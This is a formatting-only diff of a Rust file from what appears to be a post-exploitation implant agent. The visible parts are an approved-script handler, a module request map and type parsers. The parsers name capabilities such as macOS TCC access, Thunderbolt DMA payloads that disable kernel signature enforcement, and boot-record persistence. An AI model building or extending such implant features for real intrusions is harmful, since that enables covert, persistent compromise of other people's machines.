@@ -8,13 +8,13 @@
 //! - **Shell sessions**: Manages interactive shell session lifetimes.
 //! - **Loaded plugins**: Registry of dynamically loaded plugin modules.
 
-use common::lock::MutexExt;
 use base64::Engine;
+use common::lock::MutexExt;
 use common::{
     config::Config, AuditEvent, Command, CryptoSession, Message, NetDiscoveryOp, Outcome,
 };
-use once_cell::sync::Lazy;
 use module_loader::LoadedPlugin;
+use once_cell::sync::Lazy;
 use std::collections::HashMap;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
@@ -29,8 +29,9 @@ use super::fsops;
 // sender keyed by `module_id`.  When the corresponding `ModuleResponse`
 // arrives in the main loop, the oneshot is completed with the encrypted
 // blob, unblocking the handler.
-pub static PENDING_MODULE_REQUESTS: Lazy<Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>>> =
-    Lazy::new(|| Mutex::new(HashMap::new()));
+pub static PENDING_MODULE_REQUESTS: Lazy<
+    Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>>,
+> = Lazy::new(|| Mutex::new(HashMap::new()));
 
 /// Reject any module identifier that contains characters outside the
 /// safe alphabet. Prevents path traversal via the `DeployModule`
@@ -100,7 +101,9 @@ fn parse_tcc_resource(name: &str) -> crate::macos_postexp::TccResource {
 
 /// Parse a DMA payload type string into a `crate::hardware_persistence::DmaPayloadType`.
 #[cfg(feature = "hardware-persistence")]
-fn parse_dma_payload_type(name: &str) -> Result<crate::hardware_persistence::thunderbolt_dma::DmaPayloadType, String> {
+fn parse_dma_payload_type(
+    name: &str,
+) -> Result<crate::hardware_persistence::thunderbolt_dma::DmaPayloadType, String> {
     use crate::hardware_persistence::thunderbolt_dma::DmaPayloadType;
     match name {
         "KernelDseDisable" => Ok(DmaPayloadType::KernelDseDisable),
@@ -117,7 +120,9 @@ fn parse_dma_payload_type(name: &str) -> Result<crate::hardware_persistence::thu
 
 /// Parse a persistence artifact type string into a `crate::hardware_persistence::boot_persistence::PersistenceArtifactType`.
 #[cfg(feature = "hardware-persistence")]
-fn parse_persistence_artifact_type(name: &str) -> crate::hardware_persistence::boot_persistence::PersistenceArtifactType {
+fn parse_persistence_artifact_type(
+    name: &str,
+) -> crate::hardware_persistence::boot_persistence::PersistenceArtifactType {
     use crate::hardware_persistence::boot_persistence::PersistenceArtifactType;
     match name {
         "VbrModification" => PersistenceArtifactType::VbrModification,
@@ -3028,7 +3033,6 @@ fn handle_run_approved_script(name: &str) -> Result<String, String> {
         // Each name maps to a deterministic, side-effect-bounded operation.
         // No arbitrary command execution — only pre-registered routines that
         // the operator can invoke by name via `Command::RunApprovedScript`.
-
         "health_check" => {
             // Basic liveness / readiness probe.  Returns a short JSON
             // payload with hostname and uptime so the operator can
@@ -3073,8 +3077,7 @@ fn handle_run_approved_script(name: &str) -> Result<String, String> {
                 return Ok("[]".to_string());
             }
             let mut entries: Vec<String> = Vec::new();
-            let read_dir =
-                std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
+            let read_dir = std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
             for entry in read_dir.flatten() {
                 if let Some(name) = entry.file_name().to_str() {
                     entries.push(name.to_owned());
@@ -3094,8 +3097,7 @@ fn handle_run_approved_script(name: &str) -> Result<String, String> {
                 return Ok("{\"purged\": 0}".to_string());
             }
             let mut purged: usize = 0;
-            let read_dir =
-                std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
+            let read_dir = std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
             for entry in read_dir.flatten() {
                 if entry.path().is_file() {
                     if std::fs::remove_file(entry.path()).is_ok() {
